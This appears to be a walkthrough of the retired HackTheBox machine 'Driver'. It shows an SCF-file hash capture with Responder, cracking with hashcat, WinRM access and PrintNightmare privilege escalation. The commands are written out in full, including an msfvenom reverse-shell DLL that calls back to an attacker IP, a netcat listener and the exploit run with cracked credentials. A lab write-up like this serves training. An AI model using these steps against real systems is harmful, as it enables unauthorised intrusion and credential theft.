*2021-10-28*

*kimm3*

# Walkthrough: Driver
Platform: HackTheBox

Difficulty: Easy

Uploaded after retirement.
## Setup
![ll](assets/markdown-img-paste-20210826112245589.png)

```
script history/enum1
export IP=10.10.11.106; ping $IP
```

(Machine responds to ICMP echo)
## Scans and enumeration
`sudo nmap $IP -p- -Pn -v -A -oA scans/nmap-init`

![nmap-init](assets/markdown-img-paste-20211028072800526.png)

HTTP, SMB and WinRM open.

![mfp](assets/markdown-img-paste-20211028072322843.png)

![mfp-login](assets/markdown-img-paste-20211028072355308.png)

HTTP-AUTH is active for the site. No credentials gives us no access. Some very default/common credentials gets us into the site.

![fw-upload](assets/markdown-img-paste-20211028072502283.png)

There's an upload page, '/fw_up.php'. No repsonse when uploading a file - returns to the same page. The text says that it uploads to a share, probably the SMB share.

![smb-denied](assets/markdown-img-paste-20211028072824254.png)

Access denied without password on SMB.

## Foothold
Did a bunch of directyory searches/web fuzzing to try to find a upload folder, but there's no way to trigger a shell by simply uploading it and trigger it via HTTP. Instead, a SFC attack did the trick:

![burp-upload](assets/markdown-img-paste-20211028082634739.png)

Upload a file with contents as in the red text. Filename should start with '@' to get displayed at top, and end with '.sfc' extension. Whenever a user opens this in explorer, it will try to get an icon at the address we specified.

Start responder to capture the hash.

`responder -I tun0`

![hash-captured](assets/markdown-img-paste-20211028082703283.png)

![hashid](assets/markdown-img-paste-20211028083122784.png)

Hash captured and is valid NetNTLMv2, crack it with hashcat:

`hashcat -a 0 -m 5600 creds/tonyhash sl/Passwords/Leaked-Databases/rockyou.txt`

![cracked](assets/markdown-img-paste-20211028083333180.png)

WinRM is enabled on default http port 5985, we can use this to get a shell.

![winrm](assets/markdown-img-paste-20211028083425612.png)

![usertxt](assets/markdown-img-paste-20211028083603393.png)

## Further enumeration
![users](assets/markdown-img-paste-2021102808380213.png)

Two more users active, Mario and Administrator, they're both in admin group.

![upload-winpeas](assets/markdown-img-paste-20211028132347980.png)

Used winPEAS to do further enumeration. The job that probably triggered the sfc file is under tonys appdata folder. Did some further research but decided not to touch so that we don't mess things up for other users.

![wp-scheduled](assets/markdown-img-paste-20211028132900473.png)

![firmware-task](assets/markdown-img-paste-20211028133657770.png)

![accesschk-job](assets/markdown-img-paste-20211028134347480.png)

#### You might have to reset the box
The whole box hints you that the PrintNightmare hack could be possible. However when I checked the 'Spooler' service, which is required, it was stopped and we didn't have privileges to start it, so contiuned to enumerate/research. After some time, I tried to reset the box and checked the Spooler service, and it was running.

The service will stop if someone uses this exploit, if they don't start it manually again, it won't work for other users.

![spooler](assets/markdown-img-paste-20211029032044111.png)

## Privilege Escalation
Tried [this](https://github.com/calebstewart/CVE-2021-1675) first, a ps1 script for printnightmare, but we can't run scripts from our shell.

![no-scripts](assets/markdown-img-paste-2021102901311325.png)

[This](https://github.com/cube0x0/CVE-2021-1675) might let us do it remotely with SMB. Follow the steps in the readme.

![rpcdump](assets/markdown-img-paste-2021102903251484.png)

Check if exploit is possible.

Start SMB-server of choice, hosting a dll reverse shell.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.4 LPORT=443 -f dll -o upload/glhf.dll
smbserver.py -ip 10.10.14.4 -port 445 upload upload
```

![smbserverpy](assets/markdown-img-paste-20211029033447613.png)

Check if server is working properly, and run exploit:

```
nc -lvnp 443
python3 upload/CVE-2021-1675/CVE-2021-1675.py tony:liltony@10.10.11.106 '\\10.10.14.4\upload\glhf.dll'
```

![cve-error](assets/markdown-img-paste-20211029033954222.png)

![smb-connect](assets/markdown-img-paste-2021102903405766.png)

The error and server output is normal and the revshell will work.

![roottxt](assets/markdown-img-paste-20211029040731115.png)

We got system and root flag.

## Comments
To get consistency on box(and be polite to other users if shared) start Spooler service again after you get a SYSTEM shell.

![spooler-stopped](assets/markdown-img-paste-20211029040915902.png)

![norpcdump](assets/markdown-img-paste-2021102904281653.png)

Service stopped after exploit, no output from rpcdump.py.

![netstartspooler](assets/markdown-img-paste-20211029042929665.png)

![rpcupagain](assets/markdown-img-paste-20211029042916846.png)

Started service, and it's responding again.
